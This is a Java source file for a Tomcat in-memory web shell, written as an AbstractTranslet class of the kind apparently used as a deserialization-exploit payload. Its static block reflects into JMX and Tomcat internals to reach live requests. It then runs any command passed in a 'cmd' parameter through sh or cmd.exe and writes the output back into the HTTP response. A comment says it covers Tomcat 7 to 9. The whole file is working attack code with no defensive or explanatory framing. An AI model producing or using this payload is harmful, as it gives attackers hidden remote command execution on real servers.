package org.example.tomcatmemshell.servlet;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Set;

//Tomcat 7,8,9 通用
public class GenericTomcatMemShell3 extends AbstractTranslet {
    static {
        try {
            String pass = "cmd";
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(mbsInterceptor);
            Set<NamedObject> set = repository.query(new ObjectName("*:type=GlobalRequestProcessor,name=\"http*\""), null);

            Iterator<NamedObject> it = set.iterator();
            while (it.hasNext()) {
                NamedObject namedObject = it.next();
                field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("name");
                field.setAccessible(true);

                field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
                field.setAccessible(true);
                Object obj = field.get(namedObject);

                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                Object resource = field.get(obj);

                field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                field.setAccessible(true);
                ArrayList processors = (ArrayList) field.get(resource);

                field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                field.setAccessible(true);
                for (int i=0; i < processors.size(); i++) {
                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) field.get(processors.get(i));
                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);

                    String cmd = request.getParameter(pass);
                    //shiro
                    //String cmd = request.getHeader(pass);
                    String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                    String out = s.hasNext() ? s.next() : "";

                    java.io.Writer writer = request.getResponse().getWriter();
                    java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                    usingWriter.setAccessible(true);
                    usingWriter.set(request.getResponse(), Boolean.FALSE);
                    writer.write(out);
                    writer.flush();

                }
            }
        }catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
